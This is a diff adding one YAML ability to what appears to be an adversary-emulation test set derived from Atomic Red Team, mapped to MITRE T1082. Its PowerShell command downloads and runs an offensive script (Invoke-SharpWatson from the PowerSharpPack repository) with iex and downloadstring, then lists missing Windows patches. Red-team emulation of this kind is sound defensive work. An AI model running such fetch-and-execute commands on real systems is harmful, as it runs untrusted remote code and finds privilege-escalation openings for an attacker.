@@ -1,0 +1,14 @@
+- id: acc86031-e254-5e53-a2fd-ba50b9d4833e
+  name: Soumaia ART Tests - WinPwn - PowerSharpPack - Watson searching for missing windows patches
+  description: PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  platforms:
+    windows:
+      psh:
+        command: |-
+          $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
+          Invoke-watson
